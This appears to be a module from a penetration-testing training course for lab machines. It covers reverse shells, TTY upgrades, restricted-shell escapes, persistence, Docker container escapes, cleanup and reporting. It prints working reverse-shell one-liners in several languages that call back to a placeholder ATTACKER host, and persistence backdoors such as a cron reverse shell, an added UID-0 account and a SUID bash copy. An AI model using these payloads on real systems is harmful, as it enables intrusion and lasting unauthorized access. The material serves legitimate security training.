# 06 — Shells, Persistence and Escapes

Getting a shell is the halfway point, not the finish line. This module covers what
to do the moment a payload fires: stabilising the terminal, escaping a restricted
shell, holding access, getting out of a container, and — importantly — undoing all
of it.

Full treatment: [`docs/CONCEPTS.md` §12](../docs/CONCEPTS.md#12-shells--bind-reverse-and-ttys)
and [§16](../docs/CONCEPTS.md#16-post-exploitation-and-lateral-movement).

---

## 1. Reverse vs bind

| | **Reverse shell** | **Bind shell** |
| --- | --- | --- |
| Who connects | **target → you** | **you → target** |
| Firewall | Usually passes (outbound is often unrestricted) | Usually blocked (inbound to an odd port is denied) |
| Your IP must be | Routable from the target | Irrelevant |
| Default choice | ✅ **Yes** | Only when the target cannot reach you |

```bash
# ATTACKER: listen first
nc -lvnp 4444
# TARGET payload
bash -i >& /dev/tcp/ATTACKER/4444 0>&1
```

`nc -lvnp 4444` — `-l` listen, `-v` verbose, `-n` no DNS resolution, `-p 4444`
port. **Start the listener before you trigger the payload.** Forgetting this is the
most common self-inflicted failure in the entire path.

> **Ports below 1024 need root.** `nc -lvnp 80` fails unless you use `sudo`. Use
> 4444, 4445, 9001 or similar; if you must use a low port, `sudo nc -lvnp 443`.

### Payloads that work when `bash` does not

Not every environment has bash, `nc`, or a shell at all. Know several:

```bash
# bash's /dev/tcp — needs no nc
bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# netcat variants
nc -e /bin/bash ATTACKER 4444
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER 4444 > /tmp/f

# python
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("ATTACKER",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'

# perl, php, ruby, socat
perl -e 'use Socket;$i="ATTACKER";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");'
php -r '$sock=fsockopen("ATTACKER",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
socat TCP:ATTACKER:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane   # fully interactive
```

**`socat` is worth the extra setup** because it gives you a *proper* PTY in one
step, with job control:

```bash
# ATTACKER
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

Machine 4's `less`/`vi` escalation and Machine 9's `lxd` escape both benefit from a
stabilised shell before you attempt the next step.

---

## 2. Upgrading to a full TTY

A raw `nc` shell has no TTY. Symptoms: `sudo` refuses to prompt, `Ctrl+C` kills
your listener instead of the remote command, arrow keys print `^[[A`, `vi` is
unusable, and tab completion does nothing.

**Quick upgrade:**

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
script -q /dev/null -c /bin/bash
```

**Full upgrade — the two-step, worth memorising:**

```bash
# STEP 1 (on the target)
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm-256color
# STEP 2: press  Ctrl+Z          -> back at your OWN shell
# STEP 3 (on your attack box)
stty raw -echo; fg
# STEP 4 (back on the target)
reset
stty rows 40 cols 160            # match your terminal: stty size
```

> ### 📖 Concept — Why `Ctrl+Z` behaves strangely, and why `stty raw -echo` fixes it
> Your local terminal driver is interpreting keystrokes *before* they reach `nc`: it
> turns `Ctrl+C` into SIGINT for the local process and handles backspace and line
> editing itself. That is why `Ctrl+C` kills your listener and why arrow keys arrive
> as escape sequences.
>
> `stty raw -echo` tells your local terminal to **stop interpreting anything** and
> pass raw bytes through, with local echo disabled — so the *remote* shell, which now
> has a real PTY, does the interpretation instead. `raw` alone would leave your
> keystrokes echoed twice.
>
> **The cost:** `raw` disables `Ctrl+C` and `Ctrl+Z` on your local side, so you can
> no longer interrupt the session locally. To get out, type `exit`, or kill the
> listener from a second terminal. **If your terminal looks broken afterwards, type
> `reset` blind and press Enter** — it works even with echo off.

> **Match the window size.** If `vi` or `top` renders garbage, run `stty size`
> locally and `stty rows R cols C` on the target. This is cosmetic but it wastes
> twenty minutes if you do not know the cause.

---

## 3. Escaping a restricted shell (`rbash`)

A restricted shell limits what you may do — typically no `cd`, no setting `PATH`, no
redirecting output, and no commands containing `/`.

```bash
$ cd /tmp
rbash: cd: restricted
$ /bin/ls
rbash: /bin/ls: restricted
```

First confirm what you are in: `echo $0`, `echo $SHELL`, `set -o | grep restricted`,
`ls -l /bin/sh`.

**The escapes, most reliable first:**

| # | Technique | Command |
| --- | --- | --- |
| 1 | A program that spawns a shell | `find . -exec /bin/sh \; -quit` |
| 2 | An interpreter | `python3 -c 'import os; os.system("/bin/bash")'` · `perl -e 'exec "/bin/sh"'` · `awk 'BEGIN{system("/bin/sh")}'` |
| 3 | A pager's shell command | `less /etc/profile` then `!/bin/sh` · `more` likewise |
| 4 | An editor | `vi -c ':!/bin/sh'` · `vi` then `:set shell=/bin/sh` `:shell` |
| 5 | `ssh` with a command | `ssh user@target -t "/bin/bash --noprofile"` |
| 6 | `env` / `ftp` / `gdb` | `env /bin/sh` · `ftp -e 'shell'` · `gdb -q -ex 'shell /bin/sh'` |
| 7 | Coping with the redirect ban | `tar cf /dev/null /etc` `--checkpoint=1 --checkpoint-action=exec=/bin/sh` |

**Machine 4 (DC: 2) is the canonical rbash box.** Its SSH user lands in a
restricted shell, and the intended solution is to escape through a program that is
permitted — then `sudo less` or `sudo vi` gives you root (see
[module 05 §1](05-Linux-Privilege-Escalation.md)).

**Machine 6 (bossplayersCTF)** and **Machine 10 (PwnLab: init)** both have shell
escapes too, via different doors.

> **`--noprofile` and `--norc` matter.** A restricted shell is often imposed by
> `~/.bashrc` or `~/.profile` rather than by the binary itself. Spawning bash with
> those files skipped gives you an unrestricted shell with no escape technique at all.
> `ssh user@target -t 'bash --noprofile'` is worth trying before anything clever.

---

## 4. Persistence

Once you are in, access is fragile: the machine may be rebooted, the web shell
deleted, or your listener dropped. Persistence means surviving that.

```bash
# 1. SSH key — the cleanest and most common
echo 'ssh-rsa AAAA... attacker@kali' >> /home/user/.ssh/authorized_keys
chmod 700 /home/user/.ssh; chmod 600 /home/user/.ssh/authorized_keys   # sshd IGNORES loose perms
ssh -i id_rsa user@target

# 2. A web shell that survives (Machine 13's upload, Machine 3's theme editor)
#    /var/www/html/wp-content/uploads/2019/04/x.php

# 3. A cron entry running as your user
echo '* * * * * /bin/bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"' | crontab -

# 4. A startup file
echo '...' >> ~/.bashrc      # fires on interactive login
echo '...' >> /etc/rc.local  # fires at boot, if root

# 5. A new account (Machine 1's /etc/passwd trick IS persistence)
echo 'ignite:HASH:0:0::/root:/bin/bash' >> /etc/passwd

# 6. SUID backdoor (leaves a very loud forensic trace)
cp /bin/bash /tmp/.x && chown root /tmp/.x && chmod u+s /tmp/.x
/tmp/.x -p
```

> ### 📖 Concept — Persistence and the blue team
> Every technique above leaves an artefact: a key in `authorized_keys`, a line in a
> crontab, a file with an SUID bit, a web shell in an uploads directory, a UID-0
> account that should not exist. Defenders detect on exactly these — file integrity
> monitoring (AIDE, Tripwire), cron auditing, `authorized_keys` review, and web-root
> diffing. When you write up a machine, **list what you left behind**: it turns your
> notes into a detection-rule specification, which is half the value of the exercise.

**Also: keep your notes.** Every credential, every uploaded file path, every
modified config. See the note-taking template in
[module 00 §6](00-Before-You-Start.md).

---

## 5. Escaping a container (Machine 13)

**Machine 13 (HackInOS: 1)** ends inside a Docker container with `root`. `id` says
`uid=0`, and yet the flag is not reachable — because container root is **not** host
root.

> ### 📖 Concept — Why container root is not real root
> A container is a set of namespaces (isolated view of processes, network, mounts,
> users) plus cgroups (resource limits) plus a filtered capability set and seccomp
> profile. Your `uid=0` is root *inside the user namespace the container defines*.
> The dangerous files — the host's `/etc/shadow`, the host's Docker socket — are not
> mounted in. Escaping means finding a bridge back to a host-privileged context.

**First, confirm where you are:**

```bash
cat /proc/1/cgroup | grep -q docker && echo "IN A CONTAINER"
ls -la /.dockerenv                      # present in most Docker containers
cat /proc/self/mountinfo | grep overlay # overlayfs = container filesystem
hostname; ip a; ps aux | head -20       # tiny PID list, odd IP
```

**Then look for a bridge:**

| Finding | Escape |
| --- | --- |
| `/var/run/docker.sock` mounted | `curl --unix-socket /var/run/docker.sock http://localhost/containers/json` → create a privileged container mounting host `/` |
| A **privileged** container (`CapEff: 0000003fffffffff`) | `mount /dev/sda1 /mnt` → write to host root |
| `cap_sys_admin` | mount cgroups / `release_agent` trick |
| A **mounted host directory** | Write a cron job or an `authorized_keys` into it |
| `--pid=host` | `nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash` |
| A vulnerable kernel + `--privileged` | any local-root exploit reaches the host |

Machine 13's route is the **mounted host volume**: the container's filesystem is
shared with the host in one specific directory, and writing there lands you on the
host. Check `/proc/mounts` for anything bind-mounted from outside:

```bash
cat /proc/mounts | grep -v 'overlay\|proc\|sysfs\|cgroup\|tmpfs\|devpts\|mqueue'
ls -la /            # look for an unusual directory
```

> **Also worth knowing:** the *other* container escape in this path is the `lxd` one
> on Machine 9, which is not really an escape at all — it is using a legitimately
> granted group membership to create a **privileged** container with the host root
> mounted. See [module 05 §8](05-Linux-Privilege-Escalation.md).

---

## 6. Cleaning up — non-negotiable

You are working on a machine you own, on a network you own. That does not license
leaving it in a worse state, and the discipline transfers directly to paid
engagements.

```bash
# remove your web shell
rm -f /var/www/html/wp-content/uploads/2019/04/x.php

# remove your cron entries
crontab -l | grep -v 'ATTACKER' | crontab -
rm -f /etc/cron.d/mine

# remove your SSH key
#   edit /home/user/.ssh/authorized_keys and delete YOUR line only

# remove the account you created
#   delete the line from /etc/passwd (and /etc/shadow if you touched it)

# remove any uploaded binary or script
rm -f /tmp/x /tmp/f /tmp/.x

# restore files you edited
```

**Then verify:** re-run `ls -la` on every path you touched, and `crontab -l`, and
`cat /etc/passwd | tail`.

> **The better answer on a lab is the snapshot.** If you snapshotted the VM before
> you started ([module 00 §4](00-Before-You-Start.md)), revert to it. That is
> guaranteed-complete cleanup. The reason to still practise manual cleanup is that on
> a real engagement you often cannot revert — and because writing down exactly what
> you changed is a deliverable your client is entitled to.

---

## 7. Reporting

Every machine in this path should end with a short write-up. Structure it the way
[`labs/3-059-raven-1/README.md`](../labs/3-059-raven-1/README.md) is structured —
that file is the house reference implementation and is worth reading once in full
before you write your own.

The minimum per finding:

| Field | Example |
| --- | --- |
| **What** | Anonymous FTP exposes `backup.zip` containing `wp-config.php` |
| **Where** | `ftp://192.168.56.101/pub/backup.zip` |
| **How you found it** | `nmap -sC -p21` reported `ftp-anon: Anonymous FTP login allowed` |
| **Impact** | Full database credentials → admin access → RCE |
| **Evidence** | Screenshot / exact command output |
| **Fix** | Disable anonymous FTP; move backups outside the served tree; rotate credentials |

**Severity is about impact and reachability, not cleverness.** A world-writable
`/etc/passwd` found in ten seconds is *critical*; an obscure XSS nobody can reach
is *low*. Rate what the client loses.

---

## 8. Exercises

1. **Catch a reverse shell against yourself.** Run `python3 -m http.server` on a
   directory containing a `shell.php` that calls back to `nc -lvnp 4444` on your
   attack box, load it in a browser, and describe exactly what appeared.
2. **Upgrade a raw shell** using both the quick method and the full two-step. Note
   what `sudo`, `vi` and `Ctrl+C` do before and after.
3. **Break and repair your terminal.** Run `stty raw -echo` locally, observe that
   typing appears to do nothing, then recover with a blind `reset`. Do this
   deliberately once so it never surprises you mid-lab.
4. **Build your own rbash.** `cp /bin/bash ~/rbash`, add `rbash` to `/etc/shells`,
   create a user whose shell is `~/rbash`, and set `PATH` to a directory with only
   `ls` and `cat`. Try the seven escapes above. Which worked?
5. **Inspect a container from inside.** `docker run -it --rm alpine sh`, then run
   every detection command in §5. Now run `docker run -it --rm -v
   /var/run/docker.sock:/var/run/docker.sock alpine sh` and confirm you can list the
   host's containers.
6. **Write a full clean-up list** for one machine you have already completed in this
   path, naming every artefact you created and the command that removes it.

---

## 9. Check yourself

1. Why is a reverse shell the default choice over a bind shell?
2. Name three payloads that work when `bash` and `nc` are both absent.
3. Your shell will not let `sudo` prompt for a password. What is wrong, and what are
   the two commands that fix it?
4. What does `stty raw -echo` do to your local terminal, and what is the cost?
5. Your terminal is unusable after a session. What do you type, and why does it work
   even though you cannot see it?
6. How do you confirm you are inside a Docker container?
7. Why is `uid=0` inside a container usually not host root?
8. Name three bridges out of a container.
9. Why does `bash --noprofile` sometimes defeat a restricted shell with no exploit
   at all?
10. List four artefacts you must remove before handing a machine back.

---

_Back to [Learning Path 1](README.md) · previous: [05 — Linux Privilege Escalation](05-Linux-Privilege-Escalation.md) · next: the [machine lesson cards](Machines/01-basic-pentesting-1.md)._
